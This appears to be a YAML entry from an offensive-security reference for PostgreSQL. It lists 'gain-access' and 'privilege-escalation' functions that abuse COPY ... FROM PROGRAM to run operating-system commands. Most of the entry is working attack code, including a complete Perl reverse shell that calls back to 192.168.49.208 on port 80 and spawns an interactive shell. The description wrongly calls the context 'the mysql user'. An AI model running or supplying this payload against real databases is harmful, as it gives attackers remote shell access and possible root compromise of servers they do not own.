---
functions:
  gain-access:
    - description: Use code execution to pop a shell in the context of the mysql user
      code: |
        version 9.3 +
        CREATE TABLE cmd_exec(cmd_output text);
        COPY cmd_exec FROM PROGRAM '<shell commands>';SELECT * FROM cmd_exec;

        DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'perl -e "use Socket;\$i=\"192.168.49.208\";\$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};"';SELECT * FROM cmd_exec;
        
  privilege-escalation:
    - description: Use code execution to escalate privileges if postgres is running as root
      code: |
        # Same as gain access

resources : |
  https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5
---

